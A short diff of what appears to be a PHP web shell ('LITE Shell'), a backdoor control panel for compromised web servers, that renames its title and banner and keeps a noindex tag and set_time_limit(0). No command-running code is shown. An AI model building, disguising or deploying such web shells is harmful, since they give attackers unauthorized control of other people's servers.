@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<?php echo "<title>LOL</title>"; ?>
+	<?php echo "<title>:D</title>"; ?>
 	<meta name="robots" content="noindex">
 	<link rel="icon" href="https://brebes-bx.biz.id/bbx.jpg" type="image/x-icon">
 </head>
@@ -113,7 +113,7 @@ option {
 </style>
 <center>
 <?php
-echo '<font face="Bungee" size="5">LITE Shell</font></center>
+echo '<font face="Bungee" size="5">LOL:D</font></center>
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>';
 set_time_limit(0);
